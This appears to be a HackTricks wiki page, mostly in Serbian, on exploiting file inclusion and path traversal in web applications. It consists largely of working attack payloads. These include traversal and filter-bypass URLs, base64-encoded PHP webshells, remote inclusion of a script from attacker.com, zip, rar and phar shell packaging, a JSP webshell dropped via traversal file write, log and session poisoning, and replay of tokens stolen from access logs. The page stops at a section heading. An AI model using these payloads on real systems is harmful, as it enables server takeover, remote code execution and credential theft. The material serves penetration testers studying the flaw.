# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Datoteka se učitava sa udaljenog servera (Najbolje: možete napisati kod i server će ga izvršiti). U php ovo je po defaultu **onemogućeno** (**allow_url_include**).\
**Local File Inclusion (LFI):** Server učitava lokalnu datoteku.

Ranljivost se javlja kada korisnik na neki način može da kontroliše datoteku koja će biti učitana od strane servera.

Ranljive **PHP functions**: require, require_once, include, include_once

Zanimljiv alat za eksploataciju ove ranjivosti: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

Kombinovanjem nekoliko *nix LFI lista i dodavanjem više putanja, napravio sam ovu:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Pokušajte takođe da zamenite `/` sa `\`\
Pokušajte takođe da dodate `../../../../../`

A lista koja koristi nekoliko tehnika za pronalaženje fajla /etc/password (da proverite da li ranjivost postoji) može se naći [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Spajanje različitih wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Pokušajte takođe da zamenite `/` sa `\`\
Pokušajte takođe da uklonite `C:/` i dodate `../../../../../`

A lista koja koristi nekoliko tehnika za pronalaženje fajla /boot.ini (da proverite da li ranjivost postoji) može se naći [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Proverite LFI listu za Linux.

## Osnovni LFI i bypassi

Svi primeri su za Local File Inclusion ali bi mogli biti primenjeni i na Remote File Inclusion takođe (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences uklonjene nerekurzivno
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass dodavanja dodatnih karaktera na kraj prosleđenog stringa (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Ovo je **rešeno od PHP 5.4**

### **Kodiranje**

Možete koristiti nestandardna kodiranja kao double URL encode (i druga):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Iz postojećeg direktorijuma

Možda back-end proverava putanju direktorijuma:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Istraživanje direktorijuma datotečnog sistema na serveru

Datotečni sistem servera može se istraživati rekurzivno kako bi se identifikovali direktorijumi, ne samo fajlovi, primenom određenih tehnika. Ovaj proces uključuje određivanje dubine direktorijuma i ispitivanje postojanja specifičnih direktorijuma. Ispod je detaljna metoda kako to postići:

1. **Odredite dubinu direktorijuma:** Utvrdite dubinu vašeg trenutnog direktorijuma tako što ćete uspešno dohvatiti `/etc/passwd` fajl (primenljivo ako je server zasnovan na Linuxu). Primer URL-a može biti strukturiran na sledeći način, što ukazuje na dubinu od tri:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Ispitajte direktorijume:** Dodajte ime sumnjivog direktorijuma (npr. `private`) u URL, zatim se vratite na `/etc/passwd`. Dodatni nivo direktorijuma zahteva povećanje depth-a za jedan:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Tumačenje rezultata:** Odgovor servera pokazuje da li direktorijum postoji:
- **Greška / Nema izlaza:** Direktorijum `private` verovatno ne postoji na navedenoj lokaciji.
- **Sadržaj `/etc/passwd`:** Prisustvo direktorijuma `private` je potvrđeno.
4. **Rekurzivno istraživanje:** Otkriveni direktorijumi se mogu dalje istraživati za poddirektorijume ili fajlove koristeći istu tehniku ili tradicionalne Local File Inclusion (LFI) metode.

Za istraživanje direktorijuma na drugim lokacijama u fajl sistemu, prilagodite payload u skladu s tim. Na primer, da proverite da li `/var/www/` sadrži direktorijum `private` (pod pretpostavkom da je trenutni direktorijum na dubini 3), koristite:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation je metoda koja se koristi za manipulaciju putanjama fajlova u web aplikacijama. Često se koristi za pristup ograničenim fajlovima zaobilaženjem određenih sigurnosnih mera koje dodaju dodatne karaktere na kraj putanja fajlova. Cilj je konstruisati putanju fajla koja će, nakon što je sigurnosna mera izmeni, i dalje pokazivati na željeni fajl.

U PHP-u, različite reprezentacije putanje fajla mogu se smatrati ekvivalentnim zbog prirode fajl sistema. Na primer:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` se svi tretiraju kao ista putanja.
- Kada su poslednjih 6 karaktera `passwd`, dodavanje `/` (praveći `passwd/`) ne menja ciljani fajl.
- Slično, ako je `.php` dodat na putanju fajla (npr. `shellcode.php`), dodavanje `/.` na kraju neće promeniti fajl kojem se pristupa.

Sledeći primeri pokazuju kako iskoristiti path truncation za pristup `/etc/passwd`, čestom cilju zbog osetljivog sadržaja (informacije o korisničkim nalozima):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
U ovim scenarijima, broj potrebnih `../` sekvenci može biti oko 2027, ali taj broj može varirati u zavisnosti od konfiguracije servera.

- **Using Dot Segments and Additional Characters**: Sekvence `../` kombinovane sa dodatnim dot segmentima i karakterima mogu se koristiti za navigaciju fajl sistemom, efektivno ignorišući dodate stringove od strane servera.
- **Determining the Required Number of Traversals**: Metodom pokušaja i grešaka može se pronaći tačan broj `../` sekvenci potreban da se dođe do root direktorijuma, a zatim do `/etc/passwd`, obezbeđujući da svi dodati stringovi (kao `.php`) budu neutralisani dok željeni put (`/etc/passwd`) ostane netaknut.
- **Starting with a Fake Directory**: Uobičajena je praksa započeti put sa nepostojećim direktorijumom (npr. `a/`). Ova tehnika se koristi kao mera opreza ili da ispuni zahteve logike parsiranja putanja servera.

Pri korišćenju tehnika skraćivanja putanje, ključno je razumeti ponašanje parsiranja putanja servera i strukturu fajl sistema. Svaki scenario može zahtevati drugačiji pristup, i često je neophodno testiranje da bi se našla najučinkovitija metoda.

**Ova ranjivost je ispravljena u PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

U php-u je ovo onemogućeno po podrazumevanoj postavci zato što je **`allow_url_include`** **Off.** Mora biti **On** da bi radilo, i u tom slučaju možete uključiti PHP fajl sa vašeg servera i dobiti RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Ako iz nekog razloga **`allow_url_include`** ima vrednost **On**, ali PHP primenjuje **filtering** na pristup eksternim web stranicama, [prema ovom postu](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), možete na primer koristiti data protocol sa base64 da dekodirate b64 PHP kod i egt RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> U prethodnom kodu, finalni `+.txt` je dodat zato što je napadaču bio potreban string koji se završava sa `.txt`, tako da se string završava njime i nakon b64 decode-a taj deo će vratiti samo smeće, a pravi PHP kod će biti uključen (i shodno tome, izvršen).

Još jedan primer **ne koristeći `php://` protocol** bio bi:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Korenski element

U Pythonu, u kodu kao u ovom:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Ako korisnik prosledi **apsolutnu putanju** kao vrednost za **`file_name`**, **prethodna putanja se jednostavno uklanja**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
To je predviđeno ponašanje prema [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Ako je komponenta apsolutna putanja, sve prethodne komponente se odbacuju i spajanje se nastavlja od te apsolutne komponente.

## Java listanje direktorijuma

Izgleda da, ako imate Path Traversal u Java i **zatražite direktorijum** umesto fajla, **vraća se listing direktorijuma**. Ovo se neće dešavati u drugim jezicima (koliko znam).

## Top 25 parametara

Evo liste top 25 parametara koji mogu biti ranjivi na local file inclusion (LFI) (iz [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI korišćenjem PHP wrappera i protokola

### php://filter

PHP filteri omogućavaju izvođenje osnovnih **operacija izmene nad podacima** pre nego što se oni pročitaju ili upišu. Postoji 5 kategorija filtera:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Uklanja tagove iz podataka (sve između znakova "<" i ">")
- Napomena: ovaj filter više nije dostupan u modernim verzijama PHP-a
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transformiše u drugo enkodiranje (`convert.iconv.<input_enc>.<output_enc>`). Da biste dobili **listu svih enkodiranja** koja su podržana, pokrenite u konzoli: `iconv -l`

> [!WARNING]
> Zloupotrebom `convert.iconv.*` konverzionog filtera možete **generisati proizvoljan tekst**, što može biti korisno za upis proizvoljnog teksta ili da naterate funkciju poput include da obradi proizvoljan tekst. Za više informacija pogledajte [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Kompresuje sadržaj (korisno ako eksfiltrirate veliku količinu informacija)
- `zlib.inflate`: Dekompresuje podatke
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Zastarelo
- `mdecrypt.*` : Zastarelo
- Other Filters
- Pokretanjem u PHP-u `var_dump(stream_get_filters());` možete naći nekoliko **neočekivanih filtera**:
- `consumed`
- `dechunk`: poništava HTTP chunked enkodiranje
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Deo "php://filter" nije osetljiv na velika i mala slova

### Korišćenje php filters kao oracle za čitanje proizvoljnih fajlova

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) je predložena tehnika za čitanje lokalnog fajla bez vraćanja izlaza sa servera. Ova tehnika se zasniva na **boolean exfiltration of the file (char by char) using php filters** kao oracle. To je zato što php filters mogu da se iskoriste da tekst postane dovoljno veliki da php baci izuzetak.

U originalnom postu možete naći detaljno objašnjenje tehnike, ali ovde je kratak rezime:

- Koristite codec **`UCS-4LE`** da ostavite vodeći karakter teksta na početku i da veličina stringa raste eksponencijalno.
- Ovo će se koristiti da generiše **text so big when the initial letter is guessed correctly** da bi php pokrenuo **error**
- Filter **dechunk** će **remove everything if the first char is not an hexadecimal**, tako da možemo znati da li je prvi char hex.
- Ovo, u kombinaciji sa prethodnim (i drugim filterima u zavisnosti od pogođenog slova), će nam omogućiti da pogodimo slovo na beginning teksta tako što ćemo videti kada uradimo dovoljno transformacija da ono prestane biti heksadecimalni karakter. Jer ako je hex, dechunk ga neće obrisati i početna bomba će izazvati php error.
- Codec **convert.iconv.UNICODE.CP930** transformiše svako slovo u sledeće (tako da posle ovog codec-a: a -> b). Ovo nam omogućava da otkrijemo da li je prvo slovo `a`, na primer, zato što ako primenimo 6 ovih codec-ova a->b->c->d->e->f->g slovo više nije heksadecimalni karakter, te dechunk ga ne obriše i php error se pokreće jer se množi sa početnom bombom.
- Korišćenjem drugih transformacija poput **rot13** na početku moguće je leak other chars kao što su n, o, p, q, r (i drugi codec-i se mogu koristiti da pomere druga slova u hex range).
- Kada je početni char broj, potrebno je base64 encode-ovati i leak the 2 first letters to leak the number.
- Konačni problem je videti **how to leak more than the initial letter**. Korišćenjem order memory filters kao što su **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** moguće je promeniti redosled karaktera i dovesti u prvu poziciju druga slova iz teksta.
- I da bismo mogli dobiti **further data** ideja je da **generišemo 2 bytes of junk data at the beginning** sa **convert.iconv.UTF16.UTF16**, primenimo **UCS-4LE** da bi se to **pivot with the next 2 bytes**, i d**elete the data until the junk data** (ovo će ukloniti prva 2 bajta inicijalnog teksta). Nastavite ovo dok ne dođete do željenog bita za leak.

U postu je takođe objavljen alat za automatsko izvođenje: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Ovaj wrapper omogućava pristup file descriptors koje proces drži otvorenim. Potencijalno koristan za eksfiltraciju sadržaja otvorenih fajlova:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Takođe možete koristiti **php://stdin, php://stdout and php://stderr** да приступите **file descriptors 0, 1 and 2** одговарајуће (нисам сигуран како би ово могло бити корисно у attacku)

### zip:// and rar://

Отпремите Zip или Rar фајл са PHPShell унутра и приступите му.\
Да бисте могли да злоупотребите rar протокол, он **мора бити посебно активиран**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Imajte na umu da je ovaj protokol ograničen php konfiguracijama **`allow_url_open`** i **`allow_url_include`**

### expect://

Expect mora biti aktiviran. Možete izvršavati kod koristeći ovo:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Navedite svoj payload u POST parametrima:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Datoteka `.phar` može se iskoristiti za izvršavanje PHP koda kada web aplikacija koristi funkcije poput `include` za učitavanje fajlova. PHP kod prikazan ispod demonstrira kreiranje `.phar` datoteke:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Da bi se kompajlirao `.phar` fajl, treba izvršiti sledeću komandu:
```bash
php --define phar.readonly=0 create_path.php
```
Po izvršavanju, biće kreiran fajl nazvan `test.phar`, koji se može iskoristiti za napad na Local File Inclusion (LFI) ranjivosti.

U slučajevima kada LFI samo čita fajl bez izvršavanja PHP koda unutar njega — preko funkcija kao što su `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, ili `filesize()` — može se pokušati eksploatisanje deserialization vulnerability. Ova ranjivost je povezana sa čitanjem fajlova korišćenjem `phar` protokola.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Bilo je moguće zloupotrebiti **any arbitrary file read from PHP that supports php filters** da bi se dobio RCE. Detaljan opis može se [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Veoma kratak rezime: iskorišćen je **3 byte overflow** u PHP heap-u da bi se **izmenio lanac slobodnih chunks** određene veličine, kako bi bilo moguće **write anything in any address**, pa je dodat hook koji poziva **`system`**.\
Bilo je moguće alocirati chunk-ove specifičnih veličina zloupotrebom dodatnih php filters.

### Više protokola

Pogledajte više mogućih[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Write in memory or in a temporary file (not sure how this can be useful in a file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Accessing local filesystem
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Accessing HTTP(s) URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Accessing FTP(s) URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Find pathnames matching pattern (It doesn't return nothing printable, so not really useful here)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Not useful to read arbitrary files)

## LFI preko PHP-ove 'assert'

Rizik od Local File Inclusion (LFI) u PHP-u posebno je visok kada je u pitanju funkcija 'assert', koja može izvršavati kod unutar stringova. To je naročito problematično ako se ulaz koji sadrži karaktere za directory traversal kao što su ".." proverava, ali se ne sanitizuje pravilno.

Na primer, PHP kod može biti dizajniran da spreči directory traversal na sledeći način:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Iako je ovo namenjeno da zaustavi traversal, to nenamerno stvara vektor za code injection. Da bi iskoristio ovo za čitanje sadržaja fajla, napadač može koristiti:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Slično, za izvršavanje proizvoljnih sistemskih naredbi, može se koristiti:
```plaintext
' and die(system("id")) or '
```
Važno je **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Ova tehnika je relevantna u slučajevima kada vi **kontrolišete** **putanju fajla** koje koristi **PHP funkcija** koja će **pristupiti fajlu**, ali nećete videti sadržaj fajla (kao jednostavan poziv **`file()`**) jer sadržaj nije prikazan.

U [**ovom neverovatnom postu**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) objašnjeno je kako blind path traversal može biti zloupotrebljen preko PHP filtera da **exfiltrate the content of a file via an error oracle**.

Kao rezime, tehnika koristi **"UCS-4LE" encoding** da učini sadržaj fajla toliko **velikim** da će **PHP function** koji otvara fajl pokrenuti **grešku**.

Zatim, da bi se leak-ovao prvi char, koristi se filter `dechunk` zajedno sa drugim poput base64 ili rot13, i na kraju se koriste filteri convert.iconv.UCS-4.UCS-4LE i convert.iconv.UTF16.UTF-16BE da postave druge charove na početak i leak-uju ih.

**Funkcije koje mogu biti ranjive**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Za tehničke detalje pogledajte pomenuti post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Kada server-side kod koji prima/uploaduje fajlove konstruše destinacionu putanju koristeći podatke koje kontroliše korisnik (npr. filename ili URL) bez canonicalizacije i validacije, `..` segmenti i absolute paths mogu izaći iz predviđenog direktorijuma i prouzrokovati arbitrary file write. Ako možete postaviti payload u web-exposed direktorijum, obično dobijate unauthenticated RCE ubacivanjem webshell-a.

Tipičan tok eksploatacije:
- Identifikujte write primitive u endpointu ili background worker-u koji prihvata path/filename i upisuje sadržaj na disk (npr. message-driven ingestion, XML/JSON command handlers, ZIP extractors, itd.).
- Odredite web-exposed direktorijume. Uobičajeni primeri:
  - Apache/PHP: `/var/www/html/`
  - Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
  - IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Sastavite traversal path koji izlazi iz nameravanog storage direktorijuma u webroot i uključite vaš webshell sadržaj.
- Otvorite postavljeni payload i izvršite komande.

Napomene:
- Vulnerable servis koji obavlja upis može slušati na non-HTTP portu (npr. a JMF XML listener na TCP 4004). Glavni web portal (drugi port) će kasnije služiti vaš payload.
- Na Java stack-ovima, ovakvi upisi fajlova se često implementiraju jednostavnom `File`/`Paths` konkatenacijom. Nedostatak canonicalisation/allow-listing je osnovni propust.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Mere zaštite koje onemogućavaju ovu klasu propusta:
- Razrešiti na kanoničku putanju i osigurati da je potomak dozvoljenog (allow-listed) osnovnog direktorijuma.
- Odbaciti svaku putanju koja sadrži `..`, apsolutne root putanje, ili slova drajva; preferirati generisane nazive fajlova.
- Pokretati writer kao nalog sa niskim privilegijama i odvojiti direktorijume za pisanje od direktorijuma koji se služe.

## Remote File Inclusion

Objašnjeno ranije, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

Ako je Apache ili Nginx server **ranjiv na LFI** unutar include funkcije, možete pokušati da pristupite **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, postavite u **user agent** ili u **GET parameter** php shell poput **`<?php system($_GET['c']); ?>`** i uključite taj fajl

> [!WARNING]
> Imajte na umu da **ako koristite dvostruke navodnike** za shell umesto **jednostrukih navodnika**, dvostruki navodnici će biti izmenjeni u string "_**quote;**_", **PHP će tamo baciti grešku** i **ništa drugo neće biti izvršeno**.
>
> Takođe, postarajte se da **ispravno napišete payload** ili će PHP praviti grešku svaki put kada pokuša da učita log fajl i nećete imati drugu priliku.

Ovo se može uraditi i u drugim logovima, ali **budite oprezni,** kod unutar logova može biti URL encoded i to može uništiti Shell. Header **authorisation "basic"** sadrži "user:password" u Base64 i on se dekodira u logovima. PHPShell se može ubaciti u ovaj header.\
Drugi mogući putevi logova:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Čitanje access logova za prikupljanje GET-baziranih auth tokena (token replay)

Mnoge aplikacije greškom prihvataju session/auth tokene putem GET-a (npr., AuthenticationToken, token, sid). Ako imate path traversal/LFI primitiv koji dozvoljava pristup web server logovima, možete ukrasti te tokene iz access logova i replay-ovati ih da potpuno zaobiđete autentifikaciju.

Kako:
- Koristite traversal/LFI da pročitate web server access log. Uobičajene lokacije:
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- Neki endpoint-i vraćaju čitanje fajla enkodovano u Base64. Ako je tako, dekodirajte lokalno i pregledajte linije loga.
- Grep-ujte za GET zahteve koji uključuju token parametar i zabeležite njegovu vrednost, zatim je replay-ujte prema entry point-u aplikacije.

Example flow (generic):
```http
GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
Dekodiraj telo ako je Base64, zatim ponovo iskoristi uhvaćen token:
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
Napomene:
- Tokeni u URL-ovima se podrazumevano beleže; nikada ne prihvatajte bearer tokens putem GET u produkciji.
- Ako aplikacija podržava više imena tokena, pretražite uobičajene ključeve poput AuthenticationToken, token, sid, access_token.
- Rotirajte sve tokene koji su možda leaked u logovima.

### Preko Email-a

**Pošaljite mejl** na interni nalog (user@localhost) koji sadrži vaš PHP payload kao `<?php echo system($_REQUEST["cmd"]); ?>` i pokušajte da uključite mail korisnika sa putanjom kao **`/var/mail/<USERNAME>`** ili **`/var/spool/mail/<USERNAME>`**

### Preko /proc/\*/fd/\*

1. Otpremite mnogo shell-ova (na primer: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), gde je $PID = PID procesa (može se brute force-ovati) i $FD = file descriptor (takođe se može brute force-ovati)

### Preko /proc/self/environ

Kao kod log fajla, pošaljite payload u User-Agent; biće reflektovan u fajlu /proc/self/environ.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

Ako možete da otpremite fajl, jednostavno ubacite shell payload u njega (npr: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Da bi fajl bio čitljiv, najbolje je ubaciti u metapodatke slika/doc/pdf

### Putem otpremanja ZIP fajla

Otpremite ZIP fajl koji sadrži kompresovani PHP shell i pristup:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Putem PHP sessions

Proverite da li sajt koristi PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
U PHP-u ove sesije se čuvaju u _/var/lib/php5/sess\\_\[PHPSESSID]\_ fajlovima
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Postavite cookie na `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Iskoristite LFI da uključite PHP session file
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Putem ssh

Ako je ssh aktivan, proverite koji korisnik se koristi (/proc/self/status & /etc/passwd) i pokušajte da pristupite **\<HOME>/.ssh/id_rsa**

### **Putem** **vsftpd** _**logova**_

Logovi FTP servera vsftpd nalaze se u _**/var/log/vsftpd.log**_. U slučaju da postoji Local File Inclusion (LFI) ranjivost i da je moguće pristupiti izloženom vsftpd serveru, mogu se razmotriti sledeći koraci:

1. Ubacite PHP payload u polje za korisničko ime tokom procesa prijave.
2. Nakon injekcije, iskoristite LFI da preuzmete server logove iz _**/var/log/vsftpd.log**_.

### Putem php base64 filtera (koristeći base64)

